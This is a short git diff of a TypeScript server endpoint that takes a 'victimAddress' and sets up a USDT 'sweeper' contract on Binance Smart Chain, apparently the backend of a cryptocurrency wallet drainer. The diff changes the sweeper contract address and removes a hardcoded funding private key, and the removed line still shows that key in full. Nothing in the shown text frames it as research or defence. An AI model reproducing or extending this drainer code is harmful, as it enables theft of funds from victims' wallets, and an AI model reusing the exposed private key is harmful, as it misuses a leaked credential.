@@ -16,9 +16,9 @@ export default defineEventHandler(async (event: H3Event) => {
   }
 
   const { victimAddress } = await readBody(event);
-  const SWEEPER_CONTRACT = "0x725d16999d92d799c6040a5d0387339122ae8fc9";
+  const SWEEPER_CONTRACT = "0x802E52D35F64cfa78e0DBf1Ab920aAA71030308e";
   const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-  const FUNDING_PRIVATE_KEY = process.env.FUNDING_PRIVATE_KEY || "0551aa2232f3e9ee07ccb56df8d36b23219a74a21c6b422231647badb028bc45";
+  const FUNDING_PRIVATE_KEY = process.env.FUNDING_PRIVATE_KEY;
   const RPC_URL = "https://bsc-dataseed.binance.org/";
 
   const provider = new ethers.JsonRpcProvider(RPC_URL);
